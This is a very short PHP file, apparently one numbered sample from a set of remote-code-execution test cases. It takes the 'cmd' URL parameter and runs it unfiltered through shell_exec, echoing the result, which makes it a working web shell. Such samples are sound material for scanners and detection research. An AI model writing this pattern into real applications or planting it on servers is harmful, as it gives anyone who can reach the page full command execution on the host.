<?php
// RCE test variation #438
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>